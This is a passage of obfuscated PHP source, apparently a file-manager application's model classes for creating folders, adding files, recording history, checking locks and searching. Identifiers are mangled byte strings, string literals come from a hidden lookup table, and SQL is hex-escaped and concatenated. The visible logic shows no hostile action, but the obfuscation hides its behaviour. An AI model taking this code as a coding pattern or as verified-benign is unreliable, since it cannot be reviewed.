|| count($êÏîâµÑ) >= $‘¶Ç¼ºÈ) { break; } } return array_slice($êÏîâµÑ, 0, intval($‘¶Ç¼ºÈ)); } private function _listSearchBindPinyin($‰¡‡°§ñ, &$ÙÄ‹¬â°, &$Çä›åúğ) { $ÁÙñÀ¯ =& $_SERVER[©—Ò»ÅĞ]; if (!isset($‰¡‡°§ñ[$ÁÙñÀ¯[2281]]) || !$‰¡‡°§ñ[$ÁÙñÀ¯[2281]]) { return; } if (!Input::check($‰¡‡°§ñ[$ÁÙñÀ¯[2281]], $ÁÙñÀ¯[393]) || strlen($‰¡‡°§ñ[$ÁÙñÀ¯[2281]]) < 2) { return; } $­‚¿ÀŸù = "\114\105\106\x54\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\151\157\x5f\163\x6f\x75\x72\143\145\x5f\x6d\145\164\x61\40\155\145\x74\x61\40\157\156\40\163\157\165\162\143\145\x2e\x73\x6f\x75\x72\143\145\111\104\40\x3d\40\x6d\x65\164\x61\x2e\x73\x6f\x75\162\143\x65\111\x44"; $Âœ‘ı§¹ = array(); $Çä›åúğ = str_replace(array($ÁÙñÀ¯[285], $ÁÙñÀ¯[53], $ÁÙñÀ¯[2457]), $ÁÙñÀ¯[12], $Çä›åúğ); $Çä›åúğ = $ÁÙñÀ¯[525] . str_replace($ÁÙñÀ¯[50], $ÁÙñÀ¯[526], $Çä›åúğ); $ô÷æùö = $ÙÄ‹¬â°[$ÁÙñÀ¯[32]]; unset($ÙÄ‹¬â°[$ÁÙñÀ¯[32]]); foreach ($ÙÄ‹¬â° as $†Ïû°ö• => $Ó¶ÉŞ©Ş) { $Âœ‘ı§¹[$ÁÙñÀ¯[525] . $†Ïû°ö•] = $Ó¶ÉŞ©Ş; } foreach ($ô÷æùö as $ôÏŸøºÍ) { $Âœ‘ı§¹[] = array($ÁÙñÀ¯[530] => $ôÏŸøºÍ, $ÁÙñÀ¯[1168] => $ÁÙñÀ¯[2285], array($ÁÙñÀ¯[2458] => $ôÏŸøºÍ, $ÁÙñÀ¯[2459] => array($ÁÙñÀ¯[7], array($ÁÙñÀ¯[552], $ÁÙñÀ¯[551])))); } $this->join($­‚¿ÀŸù); $ÙÄ‹¬â° = $Âœ‘ı§¹; } private function _parseSearchWhere($Á‡Ìø˜‚) { $ˆÑæó¯ç =& $_SERVER[©—Ò»ÅĞ]; $„½£è´  = array(); if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[861]]) && $Á‡Ìø˜‚[$ˆÑæó¯ç[861]]) { $„½£è´ [$ˆÑæó¯ç[88]] = array($ˆÑæó¯ç[2460], $Á‡Ìø˜‚[$ˆÑæó¯ç[861]]); } if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[862]]) && $Á‡Ìø˜‚[$ˆÑæó¯ç[862]]) { $™½ïğù† = array($ˆÑæó¯ç[2461], $Á‡Ìø˜‚[$ˆÑæó¯ç[862]]); if ($„½£è´ [$ˆÑæó¯ç[88]]) { $„½£è´ [$ˆÑæó¯ç[88]] = array($„½£è´ [$ˆÑæó¯ç[88]], $™½ïğù†, $ˆÑæó¯ç[2462]); } else { $„½£è´ [$ˆÑæó¯ç[88]] = $™½ïğù†; } } if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[2454]]) && $Á‡Ìø˜‚[$ˆÑæó¯ç[2454]] > 0) { $„½£è´ [$ˆÑæó¯ç[79]] = array($ˆÑæó¯ç[2460], $Á‡Ìø˜‚[$ˆÑæó¯ç[2454]]); } if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[2455]]) && $Á‡Ìø˜‚[$ˆÑæó¯ç[2455]]) { $™½ïğù† = array($ˆÑæó¯ç[2461], $Á‡Ìø˜‚[$ˆÑæó¯ç[2455]]); if ($„½£è´ [$ˆÑæó¯ç[79]]) { $„½£è´ [$ˆÑæó¯ç[79]] = array($„½£è´ [$ˆÑæó¯ç[79]], $™½ïğù†, $ˆÑæó¯ç[2462]); } else { $„½£è´ [$ˆÑæó¯ç[79]] = $™½ïğù†; } } if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[684]]) && $Á‡Ìø˜‚[$ˆÑæó¯ç[684]]) { $„½£è´ [] = array($ˆÑæó¯ç[543] => $Á‡Ìø˜‚[$ˆÑæó¯ç[684]], $ˆÑæó¯ç[541] => $Á‡Ìø˜‚[$ˆÑæó¯ç[684]], $ˆÑæó¯ç[1168] => $ˆÑæó¯ç[2285]); } if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[501]]) && $Á‡Ìø˜‚[$ˆÑæó¯ç[501]]) { $òĞ‹ÚŒ = $Á‡Ìø˜‚[$ˆÑæó¯ç[501]]; if ($òĞ‹ÚŒ == $ˆÑæó¯ç[78]) { $„½£è´ [$ˆÑæó¯ç[500]] = 1; } else { if ($òĞ‹ÚŒ == $ˆÑæó¯ç[2463]) { $„½£è´ [$ˆÑæó¯ç[500]] = 0; } else { if ($òĞ‹ÚŒ) { $òĞ‹ÚŒ = is_array($òĞ‹ÚŒ) ? $òĞ‹ÚŒ : explode($ˆÑæó¯ç[50], $òĞ‹ÚŒ); $„½£è´ [$ˆÑæó¯ç[501]] = array($ˆÑæó¯ç[507], $òĞ‹ÚŒ); $„½£è´ [$ˆÑæó¯ç[500]] = 0; } } } } $this->_parseSearchParent($Á‡Ìø˜‚, $„½£è´ ); if (isset($Á‡Ìø˜‚[$ˆÑæó¯ç[2281]]) && trim($Á‡Ìø˜‚[$ˆÑæó¯ç[2281]])) { $Ù¢÷ÃÈ = trim($Á‡Ìø˜‚[$ˆÑæó¯ç[2281]]); $œÜ˜ı£ì = explode($ˆÑæó¯ç[53], $Ù¢÷ÃÈ); if (strlen($Ù¢÷ÃÈ) > 2 && (substr($Ù¢÷ÃÈ, 0, 1) == $ˆÑæó¯ç[118] && substr($Ù¢÷ÃÈ, -1) == $ˆÑæó¯ç[118]) || substr($Ù¢÷ÃÈ, 0, 1) == $ˆÑæó¯ç[58] && substr($Ù¢÷ÃÈ, -1) == $ˆÑæó¯ç[58]) { $Ù¢÷ÃÈ = substr($Ù¢÷ÃÈ, 1, -1); $œÜ˜ı£ì = array($Ù¢÷ÃÈ); } $„½£è´ [$ˆÑæó¯ç[32]] = array(array($ˆÑæó¯ç[635], $ˆÑæó¯ç[2283] . $Ù¢÷ÃÈ . $ˆÑæó¯ç[2283])); if (count($œÜ˜ı£ì) > 1) { $„½£è´ [$ˆÑæó¯ç[32]] = array(); foreach ($œÜ˜ı£ì as $ŠÓ…°äæ) { if (!trim($ŠÓ…°äæ)) { continue; } $„½£è´ [$ˆÑæó¯ç[32]][] = array($ˆÑæó¯ç[635], $ˆÑæó¯ç[2283] . trim($ŠÓ…°äæ) . $ˆÑæó¯ç[2283]); } } } return $„½£è´ ; } private function _parseSearchParent($šƒÓæ’í, &$Áı¡æÀ) { $üîã® =& $_SERVER[©—Ò»ÅĞ]; if (!isset($šƒÓæ’í[$üîã®[190]]) || !$šƒÓæ’í[$üîã®[190]]) { return; } $á„²»òÎ = $this->pathInfo($šƒÓæ’í[$üîã®[190]]); $¹üÌôµ÷ = $á„²»òÎ[$üîã®[190]] . $üîã®[12] === $üîã®[228]; $ÊÁÅ¦€ = $á„²»òÎ[$üîã®[188]] == $üîã®[598]; if ($á„²»òÎ[$üîã®[614]] == $üîã®[615]) { $‹ıı ë´ = $this->sourceInfo($šƒÓæ’í[$üîã®[190]]); $á„²»òÎ[$üîã®[604]] = $‹ıı ë´[$üîã®[604]]; } $Áı¡æÀ[$üîã®[674]] = array($üîã®[635], $á„²»òÎ[$üîã®[604]] . $šƒÓæ’í[$üîã®[190]] . $üîã®[636]); $â¹´çÇ¡ = isset($šƒÓæ’í[$üîã®[2144]]) && in_array($üîã®[598], $šƒÓæ’í[$üîã®[2144]]); if (!$â¹´çÇ¡ || !$ÊÁÅ¦€ || !$¹üÌôµ÷ || !$á„²»òÎ[$üîã®[502]]) { return; } if (!AuthModel::authCheckRoot($á„²»òÎ[$üîã®[502]][$üîã®[503]])) { return; } $Ÿ‘ß·úß = $á„²»òÎ[$üîã®[589]] . $üîã®[12]; if ($Ÿ‘ß·úß == $üîã®[91]) { unset($Áı¡æÀ[$üîã®[674]]); $Áı¡æÀ[$üîã®[188]] = self::TYPE_GROUP; return; } $¹Ü‚û€€ = Model($üîã®[605])->groupChildrenAll($Ÿ‘ß·úß); $ŞÌŞæ‡É = count($¹Ü‚û€€); if ($ŞÌŞæ‡É <= 1) { return; } $Ûìßğ›Ñ = array($üîã®[190] => 0, $üîã®[188] => self::TYPE_GROUP, $üîã®[589] => array($üîã®[7], $¹Ü‚û€€)); $ĞÚ˜ë¨ô = $this->field($üîã®[2464])->where($Ûìßğ›Ñ)->limit($ŞÌŞæ‡É)->select(); $Áı¡æÀ[$üîã®[674]] = array(); foreach ($ĞÚ˜ë¨ô as $”äâ×èÒ) { $Áı¡æÀ[$üîã®[674]][] = array($üîã®[635], $üîã®[613] . $”äâ×èÒ[$üîã®[191]] . $üîã®[636]); } $Áı¡æÀ[$üîã®[674]][] = $üîã®[2285]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($·•œüä) { $ı¦ê ª =& $_SERVER[©—Ò»ÅĞ]; $è‘¢Ò¡Ñ = Model($ı¦ê ª[597])->where(array($ı¦ê ª[1969] => $·•œüä))->find(); $åÇõ½‚† = $this->_mkdirRoot(SourceModel::TYPE_USER, $·•œüä, $è‘¢Ò¡Ñ[$ı¦ê ª[32]]); $this->userDesktopAdd($åÇõ½‚†); return $åÇõ½‚†; } public function userDesktopAdd($¯ñÕŸõ­) { $úş­ãİÔ =& $_SERVER[©—Ò»ÅĞ]; $™õáêõô = LNG($úş­ãİÔ[2465]); $â—¢£­ƒ = $this->mkdir($¯ñÕŸõ­, $™õáêõô); $this->metaSet($â—¢£­ƒ, $úş­ãİÔ[2466], $úş­ãİÔ[91]); $this->metaSet($¯ñÕŸõ­, $úş­ãİÔ[2467], $â—¢£­ƒ); } public function userPathSafeAdd($ˆ«Å¨»è) { $£Íƒ€çƒ =& $_SERVER[©—Ò»ÅĞ]; $¯—Ç×÷ß = Model($£Íƒ€çƒ[597])->getInfoFull($ˆ«Å¨»è); if (!$¯—Ç×÷ß) { return !1; } if (_get($¯—Ç×÷ß, $£Íƒ€çƒ[618])) { return $¯—Ç×÷ß[$£Íƒ€çƒ[555]][$£Íƒ€çƒ[2468]]; } $ÜÆÄ¯ê¾ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ˆ«Å¨»è, $£Íƒ€çƒ[2469], $£Íƒ€çƒ[2470]); Model($£Íƒ€çƒ[597])->metaSet($ˆ«Å¨»è, $£Íƒ€çƒ[2468], $ÜÆÄ¯ê¾); $this->metaSet($ÜÆÄ¯ê¾, $£Íƒ€çƒ[2471], $ˆ«Å¨»è); return $ÜÆÄ¯ê¾; } public function userPathAppAdd($µœ®§ñÇ, $ğº¿Î˜à = '', $Ä‡§¨ = '') { $ÆáÖÀ½ =& $_SERVER[©—Ò»ÅĞ]; $«†¾ô©å = Model($ÆáÖÀ½[597])->getInfoFull($µœ®§ñÇ); if (!$«†¾ô©å) { return !1; } $Ò„™ö¢Å = $«†¾ô©å[$ÆáÖÀ½[555]] ? $«†¾ô©å[$ÆáÖÀ½[555]] : array(); $ª«Ö×”Ê = $Ò„™ö¢Å[$ÆáÖÀ½[2472]]; if (!$ª«Ö×”Ê) { $ª«Ö×”Ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $µœ®§ñÇ, $ÆáÖÀ½[2473], $ÆáÖÀ½[2474]); Model($ÆáÖÀ½[597])->metaSet($µœ®§ñÇ, $ÆáÖÀ½[2472], $ª«Ö×”Ê . $ÆáÖÀ½[12]); $this->metaSet($ª«Ö×”Ê, $ÆáÖÀ½[2472], $µœ®§ñÇ); } if (!$ğº¿Î˜à) { return $ª«Ö×”Ê; } $‰×âÅ—‘ = $Ò„™ö¢Å[$ÆáÖÀ½[2475] . $ğº¿Î˜à]; if (!$‰×âÅ—‘) { $‰×âÅ—‘ = $this->mkdir($ª«Ö×”Ê, $ğº¿Î˜à); Model($ÆáÖÀ½[597])->metaSet($µœ®§ñÇ, $ÆáÖÀ½[2475] . $ğº¿Î˜à, $‰×âÅ—‘); $this->metaSet($‰×âÅ—‘, $ÆáÖÀ½[2475] . $ğº¿Î˜à, $µœ®§ñÇ); } if (!$Ä‡§¨) { return $‰×âÅ—‘; } $ø¸ÉµÔÆ = $this->mkdir($‰×âÅ—‘, $Ä‡§¨); return $ø¸ÉµÔÆ; } public function groupRootAdd($ìÎ¹¤òĞ) { $ˆëİ—Ğ’ =& $_SERVER[©—Ò»ÅĞ]; $ß”¯ÆŸŒ = Model($ˆëİ—Ğ’[605])->where(array($ˆëİ—Ğ’[2270] => $ìÎ¹¤òĞ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ìÎ¹¤òĞ, $ß”¯ÆŸŒ[$ˆëİ—Ğ’[32]]); } public function systemRootPathAdd($œ«¹¼Ş) { if ($œ«¹¼Ş != $_SERVER[©—Ò»ÅĞ][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $œ«¹¼Ş); } public function userRootRemove($òÄŒÃš˜) { $ê˜ÜñÃ  = $this->targetSourceRoot(SourceModel::TYPE_USER, $òÄŒÃš˜, !0); foreach ($ê˜ÜñÃ  as $ Ãæ¨¦) { if (!$ Ãæ¨¦) { continue; } $this->remove($ Ãæ¨¦[$_SERVER[©—Ò»ÅĞ][191]], !1); } } public function groupRootRemove($ÜÀı™Çİ) { $û¾ÍÃÂÁ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÜÀı™Çİ); if (!$û¾ÍÃÂÁ) { return; } $this->remove($û¾ÍÃÂÁ[$_SERVER[©—Ò»ÅĞ][191]], !1); } private function _mkdirRoot($á¥‘ƒ¾™, $‡•øğ…ø, $³ª€Ğö—, $Â“­”ŞÒ = '') { $íìÜø² =& $_SERVER[©—Ò»ÅĞ]; $òåşşÔ = KodUser::id(); $‹‰¾±˜Š = array($íìÜø²[492] => 0, $íìÜø²[670] => $á¥‘ƒ¾™, $íìÜø²[671] => $‡•øğ…ø, $íìÜø²[668] => 1, $íìÜø²[672] => $òåşşÔ, $íìÜø²[673] => $òåşşÔ, $íìÜø²[669] => $Â“­”ŞÒ, $íìÜø²[674] => $íìÜø²[613], $íìÜø²[519] => 0, $íìÜø²[640] => 0, $íìÜø²[558] => 0, $íìÜø²[675] => $íìÜø²[12]); if ($åäÍ±É = $this->where($‹‰¾±˜Š)->find()) { return $åäÍ±É[$íìÜø²[191]]; } $‹è ğ¤» = "\x4d\x6f\x64\x65\154\123\x6f\165\162\x63\x65\56\155\153\144\x69\x72\122\x6f\157\164\x2e{$á¥‘ƒ¾™}\x2e{$‡•øğ…ø}\56" . $³ª€Ğö—; CacheLock::lock($‹è ğ¤»); $‹‰¾±˜Š[$íìÜø²[32]] = $³ª€Ğö—; $ÇŸ–…ü = $this->add($‹‰¾±˜Š); $—èÎÇ‘ß = array($íìÜø²[676] => short_id($ÇŸ–…ü)); $this->where(array($íìÜø²[506] => $ÇŸ–…ü))->save($—èÎÇ‘ß); CacheLock::unlock($‹è ğ¤»); return $ÇŸ–…ü; } private function targetSourceRoot($¿‘¦¦Ë, $²ù—¿ËÊ, $âÍ‚›Ï¢ = false) { $ŠËÇÛôƒ =& $_SERVER[©—Ò»ÅĞ]; $Ğê˜–ØÒ = array($ŠËÇÛôƒ[492] => 0, $ŠËÇÛôƒ[670] => $¿‘¦¦Ë, $ŠËÇÛôƒ[671] => $²ù—¿ËÊ); if ($âÍ‚›Ï¢) { $ø„Íï¡û = $this->where($Ğê˜–ØÒ)->select(); return $ø„Íï¡û ? $ø„Íï¡û : array(); } $¨£ºë” = $this->where($Ğê˜–ØÒ)->find(); return $¨£ºë” ? $¨£ºë” : array(); } public function sourceRootGroup($éõ™’ëÏ) { $Õı¢ãÎª =& $_SERVER[©—Ò»ÅĞ]; if (is_string($éõ™’ëÏ)) { $éõ™’ëÏ = array($éõ™’ëÏ); } $šßŞ–İÑ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $éõ™’ëÏ, $Õı¢ãÎª[220]); $¤÷Ÿ·î = array($Õı¢ãÎª[446] => $šßŞ–İÑ, $Õı¢ãÎª[443] => array($Õı¢ãÎª[859] => count($éõ™’ëÏ))); $this->_listDataApply($¤÷Ÿ·î[$Õı¢ãÎª[446]]); $this->_listMake($¤÷Ÿ·î); return array_to_keyvalue($¤÷Ÿ·î[$Õı¢ãÎª[85]], $Õı¢ãÎª[589]); } public function mkfile($È³«ˆÉ, $ ÚÑ•Ôô, $×½ı™ = '', $³Ğ–Õ = REPEAT_RENAME) { $èİ’Ğ¾– =& $_SERVER[©—Ò»ÅĞ]; $ë”Š§½¯ = KodIO::ioFileDriverGet($èİ’Ğ¾–[498] . $È³«ˆÉ . $èİ’Ğ¾–[402]); $à†£ÁĞÇ = Model($èİ’Ğ¾–[696])->addFileByContent($×½ı™, $ë”Š§½¯, $ ÚÑ•Ôô); return $this->_createFileCall($È³«ˆÉ, $ ÚÑ•Ôô, $à†£ÁĞÇ, $³Ğ–Õ, $èİ’Ğ¾–[1542]); } public function addFile($™—À˜ü, $†£¾“Ï, $ÍÑÎŸá, $’Œ§¾¼½ = false, $Ì›ÃĞÏş = REPEAT_RENAME) { $ğ»¢ô¨© =& $_SERVER[©—Ò»ÅĞ]; $¸Šäµ”› = KodIO::ioFileDriverGet($ğ»¢ô¨©[498] . $™—À˜ü . $ğ»¢ô¨©[402]); $£Ç×„Áš = Model($ğ»¢ô¨©[696])->addFile($†£¾“Ï, $¸Šäµ”›, $ÍÑÎŸá, $’Œ§¾¼½); return $this->_createFileCall($™—À˜ü, $ÍÑÎŸá, $£Ç×„Áš, $Ì›ÃĞÏş); } public function addFileByFileID($ÕÉ¡ªüê, $¶Óş§, $ˆé í¹Ğ, $ÜÃ©öÛç = REPEAT_RENAME) { $İı½ÆÔÂ =& $_SERVER[©—Ò»ÅĞ]; $Ë”Üª€ = Model($İı½ÆÔÂ[696])->find($¶Óş§); Model($İı½ÆÔÂ[696])->linkAdd($¶Óş§); return $this->_createFileCall($ÕÉ¡ªüê, $ˆé í¹Ğ, $Ë”Üª€, $ÜÃ©öÛç); } public function addFileByRemote($°§ğ ¨â, $¤–šÇ–, $İÃÊŞ¡ù, $•ÇÛ®¹¹ = array(), $œĞîÖ²š = REPEAT_RENAME) { $åŸÇ€¿ä = Model($_SERVER[©—Ò»ÅĞ][696])->addFileByRemote($¤–šÇ–, $İÃÊŞ¡ù, $•ÇÛ®¹¹); return $this->_createFileCall($°§ğ ¨â, $İÃÊŞ¡ù, $åŸÇ€¿ä, $œĞîÖ²š); } private function _createFileCall($€ÓÊĞ®ª, $¦±‘Â¤¤, $¡ŞŞ„ÆÀ, $¸´˜Ğ´„, $–ùú¶¶ = "\x75\x70\154\x6f\141\x64") { $³×õƒØ£ =& $_SERVER[©—Ò»ÅĞ]; if (!$¡ŞŞ„ÆÀ) { return !1; } $í™îŸà£ = !1; $this->setMasterDB(); $this->lockWriteStart($€ÓÊĞ®ª, $¦±‘Â¤¤); $Úïô”Úî = $this->fileNameExist($€ÓÊĞ®ª, $¦±‘Â¤¤); $¶ƒŸîÁ™ = $this->_createFile($€ÓÊĞ®ª, $¦±‘Â¤¤, $¡ŞŞ„ÆÀ, $¸´˜Ğ´„, $í™îŸà£); if (!$í™îŸà£) { Model($³×õƒØ£[560])->remove($¡ŞŞ„ÆÀ[$³×õƒØ£[557]]); } if ($í™îŸà£ && $¶ƒŸîÁ™ && $¶ƒŸîÁ™ != $Úïô”Úî) { Model($³×õƒØ£[2438])->eventCreate($¶ƒŸîÁ™, $–ùú¶¶); } $this->lockWriteEnd($€ÓÊĞ®ª, $¦±‘Â¤¤); return $¶ƒŸîÁ™; } public function mkdir($ÛÖç×Š, $Äİ¹àÃú, $”ø§Êª² = REPEAT_SKIP) { $´¿İŸ» =& $_SERVER[©—Ò»ÅĞ]; $this->setMasterDB(); $—‰Ë£œ… = $this->sourceInfo($ÛÖç×Š); if (!$—‰Ë£œ…) { return !1; } $this->lockWriteStart($ÛÖç×Š, $Äİ¹àÃú); if ($”ø§Êª² !== !1) { $ß¾öâ…· = $this->fileNameExist($ÛÖç×Š, $Äİ¹àÃú); if ($ß¾öâ…· && $”ø§Êª² != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÛÖç×Š, $Äİ¹àÃú); return $ß¾öâ…·; } $Äİ¹àÃú = $this->fileNameAuto($ÛÖç×Š, $Äİ¹àÃú, $”ø§Êª²); } $ÆøÈÖ®¥ = array($´¿İŸ»[668] => 1, $´¿İŸ»[509] => $Äİ¹àÃú, $´¿İŸ»[669] => $´¿İŸ»[12], $´¿İŸ»[558] => 0, $´¿İŸ»[640] => 0); $ì‰²¤× = $this->_addSource($ÆøÈÖ®¥, $—‰Ë£œ…); Model($´¿İŸ»[2438])->eventCreate($ì‰²¤×, $´¿İŸ»[1543]); $this->lockWriteEnd($ÛÖç×Š, $Äİ¹àÃú); return $ì‰²¤×; } public function listSourceRoot($„¨ëÃáè, $†°ÇÍÆ, $—ĞÖ°Ë = "\163\x6f\165\162\143\x65\x49\104\54\164\x61\x72\x67\145\164\x49\x44\x2c\x73\151\172\145") { $³¤òºß˜ =& $_SERVER[©—Ò»ÅĞ]; $’ë÷¯‰ = $³¤òºß˜[463]; $Ûç¤Ç¥Ç = array(); $éæµøà = 1024 * 50; $«”ÃÍ„ã = is_array($«”ÃÍ„ã) ? $«”ÃÍ„ã : array(); $´€Ãöëñ = count($†°ÇÍÆ); $Ñï†•Í = $this->tablePrefix . $³¤òºß˜[470]; for ($µÊÁÆ«„ = 0; $µÊÁÆ«„ < $´€Ãöëñ; $µÊÁÆ«„++) { $‹¬í­ãô = $†°ÇÍÆ[$µÊÁÆ«„]; $’ë÷¯‰ .= "\123\105\114\105\x43\124\x20\52\40\106\x52\x4f\115\40\50\123\105\114\x45\x43\124\40{$—ĞÖ°Ë}\x20\106\x52\x4f\x4d\x20\x60{$Ñï†•Í}\x60\40\x57\x48\105\x52\105\x20"; $’ë÷¯‰ .= "\x60\160\x61\162\145\156\x74\x49\104\x60\x3d\60\x20\x41\116\104\40\140\164\141\x72\x67\145\x74\111\104\x60\x3d{$‹¬í­ãô}\40\101\x4e\x44\x20\140\x74\x61\162\147\x65\x74\x54\x79\x70\145\140\x3d{$„¨ëÃáè}\x20\x61\x6e\x64\40\146\x69\154\x65\124\x79\160\x65\75\x27\47\x20\x6c\151\x6d\x69\164\40\x31\x29\x20\x61\163\40\164\x62\137{$µÊÁÆ«„}\x20\125\116\111\117\116\40\101\x4c\114\40"; if ((strlen($’ë÷¯‰) >= $éæµøà || $µÊÁÆ«„ == $´€Ãöëñ - 1) && $’ë÷¯‰) { $’ë÷¯‰ = substr($’ë÷¯‰, 0, -strlen($³¤òºß˜[1206])); $àÜ»Ã¡ˆ = $this->query($’ë÷¯‰); $’ë÷¯‰ = $³¤òºß˜[12]; $Ûç¤Ç¥Ç = array_merge($Ûç¤Ç¥Ç, $àÜ»Ã¡ˆ); } } return $Ûç¤Ç¥Ç; } private function _createFile($ñÛ¶ñÙç, $“ôûÅè, $ªüÉÊ˜ñ, $¿¸ïÖÜ, &$ÖßÁü©â) { $œŒø¿Ó€ =& $_SERVER[©—Ò»ÅĞ]; $”Õ¾äˆˆ = $this->sourceInfo($ñÛ¶ñÙç); if (!$ªüÉÊ˜ñ || !$”Õ¾äˆˆ) { return !1; } if ($¿¸ïÖÜ !== !1) { $ï‰¯ä˜š = $this->fileNameExist($ñÛ¶ñÙç, $“ôûÅè); } $ÖßÁü©â = !0; if ($¿¸ïÖÜ && $ï‰¯ä˜š) { if ($¿¸ïÖÜ == REPEAT_SKIP) { $ÖßÁü©â = !1; return $ï‰¯ä˜š; } else { if ($¿¸ïÖÜ == REPEAT_REPLACE) { $ôù»¬İô = $this->sourceInfo($ï‰¯ä˜š); $²•ƒœ§è = $this->fileHistory($ôù»¬İô, $ªüÉÊ˜ñ[$œŒø¿Ó€[557]], $ªüÉÊ˜ñ[$œŒø¿Ó€[79]]); if (!$²•ƒœ§è) { $ÖßÁü©â = !1; } else { $this->folderSizeReset($ñÛ¶ñÙç); } return $ï‰¯ä˜š; } else { $“ôûÅè = $this->fileNameAuto($ñÛ¶ñÙç, $“ôûÅè, $¿¸ïÖÜ, !1); } } } $Øµ‰ùø = array($œŒø¿Ó€[668] => 0, $œŒø¿Ó€[509] => $“ôûÅè, $œŒø¿Ó€[669] => substr(get_path_ext($“ôûÅè), 0, 10), $œŒø¿Ó€[558] => $ªüÉÊ˜ñ[$œŒø¿Ó€[557]], $œŒø¿Ó€[640] => $ªüÉÊ˜ñ[$œŒø¿Ó€[79]]); $ºê¦Œ–¾ = $this->_addSource($Øµ‰ùø, $”Õ¾äˆˆ); $this->folderSizeReset($ñÛ¶ñÙç, intval($Øµ‰ùø[$œŒø¿Ó€[79]])); return $ºê¦Œ–¾; } protected function fileHistory($Ó›‡›í™, $øÇ±”˜, $…¨µ¢â£) { $–Ì©˜Óö =& $_SERVER[©—Ò»ÅĞ]; if ($Ó›‡›í™[$–Ì©˜Óö[557]] == $øÇ±”˜) { return !1; } $this->checkLock($Ó›‡›í™[$–Ì©˜Óö[191]], $øÇ±”˜); Model($–Ì©˜Óö[2183])->addHistory($Ó›‡›í™); $ø“§úÆº = array($–Ì©˜Óö[673] => USER_ID, $–Ì©˜Óö[513] => time(), $–Ì©˜Óö[557] => $øÇ±”˜, $–Ì©˜Óö[79] => $…¨µ¢â£); $this->where(array($–Ì©˜Óö[506] => $Ó›‡›í™[$–Ì©˜Óö[191]]))->save($ø“§úÆº); $this->sourceCacheClear($Ó›‡›í™[$–Ì©˜Óö[191]]); return !0; } public function checkLock($ºÁÂ¥—…, $‘³¦òÜÀ) { $Ë‚«Ùñî =& $_SERVER[©—Ò»ÅĞ]; $½Íö¿‰ª = $this->pathInfo($ºÁÂ¥—…); if (!$this->fileIsLock($½Íö¿‰ª, !0)) { return; } $ôÀäÍå = Session::get($Ë‚«Ùñî[2476]); $–ıÚŒ‘ = substr($½Íö¿‰ª[$Ë‚«Ùñî[32]], 0, -1 - strlen($½Íö¿‰ª[$Ë‚«Ùñî[166]])) . $Ë‚«Ùñî[1398] . $ôÀäÍå . $Ë‚«Ùñî[10] . $½Íö¿‰ª[$Ë‚«Ùñî[166]]; $¯Ğş„Ä¥ = Model($Ë‚«Ùñî[696])->find($‘³¦òÜÀ); $this->_createFileCall($½Íö¿‰ª[$Ë‚«Ùñî[190]], $–ıÚŒ‘, $¯Ğş„Ä¥, REPEAT_REPLACE, $Ë‚«Ùñî[1542]); $¦¸•†¸¾ = $½Íö¿‰ª[$Ë‚«Ùñî[555]][$Ë‚«Ùñî[633]]; $âƒå³ıÍ = $¦¸•†¸¾[$Ë‚«Ùñî[2477]] ? $¦¸•†¸¾[$Ë‚«Ùñî[2477]] : $¦¸•†¸¾[$Ë‚«Ùñî[32]]; show_json(LNG($Ë‚«Ùñî[2478]) . $Ë‚«Ùñî[2479] . LNG($Ë‚«Ùñî[2480]) . $Ë‚«Ùñî[2481] . $âƒå³ıÍ . $Ë‚«Ùñî[2482], !1); } public function fileIsLock($èøãÊó, $‘ê„ÒÌİ = false) { $«Å¬¾Ó =& $_SERVER[©—Ò»ÅĞ]; if (!_get($èøãÊó, $«Å¬¾Ó[629], 0)) { return !1; } if ($èøãÊó[$«Å¬¾Ó[555]][$«Å¬¾Ó[632]] != USER_ID) { return !0; } $Â­ÖÛ‡­ = $GLOBALS[$«Å¬¾Ó[6]][$«Å¬¾Ó[92]][$«Å¬¾Ó[630]]; if ($èøãÊó[$«Å¬¾Ó[555]][$«Å¬¾Ó[631]] <= time() - $Â­ÖÛ‡­) { $this->metaSet($èøãÊó[$«Å¬¾Ó[191]], $«Å¬¾Ó[632], null); $this->metaSet($èøãÊó[$«Å¬¾Ó[191]], $«Å¬¾Ó[631], null); } if ($‘ê„ÒÌİ) { $this->metaSet($èøãÊó[$«Å¬¾Ó[191]], $«Å¬¾Ó[631], time()); } return !1; } private function _addSource($ÜœĞ’Ê, $œ—¯½¸‹) { $÷òÃˆƒ› =& $_SERVER[©—Ò»ÅĞ]; $Â×À€€ò = KodUser::id(); $éÙÆõæÎ = array($÷òÃˆƒ›[670] => $œ—¯½¸‹[$÷òÃˆƒ›[188]], $÷òÃˆƒ›[671] => $œ—¯½¸‹[$÷òÃˆƒ›[589]], $÷òÃˆƒ›[672] => $Â×À€€ò, $÷òÃˆƒ›[673] => $Â×À€€ò, $÷òÃˆƒ›[492] => $œ—¯½¸‹[$÷òÃˆƒ›[191]], $÷òÃˆƒ›[674] => $œ—¯½¸‹[$÷òÃˆƒ›[604]] . $œ—¯½¸‹[$÷òÃˆƒ›[191]] . $÷òÃˆƒ›[50], $÷òÃˆƒ›[519] => 0, $÷òÃˆƒ›[675] => $÷òÃˆƒ›[12]); $ÜœĞ’Ê = array_merge($éÙÆõæÎ, $ÜœĞ’Ê); $this->updateModifyTime($ÜœĞ’Ê[$÷òÃˆƒ›[190]]); $ıÊµˆÑæ = $÷òÃˆƒ›[2483] . $œ—¯½¸‹[$÷òÃˆƒ›[191]]; if (isset(self::$cacheChildList[$ıÊµˆÑæ])) { unset(self::$cacheChildList[$ıÊµˆÑæ]); } static $®•ìƒŠş = false; if (!$®•ìƒŠş) { Hook::trigger($÷òÃˆƒ›[658], $ÜœĞ’Ê); $®•ìƒŠş = !0; } $³è¨€ŠÌ = $this->add($ÜœĞ’Ê); $‘£ú¸Á = array($÷òÃˆƒ›[676] 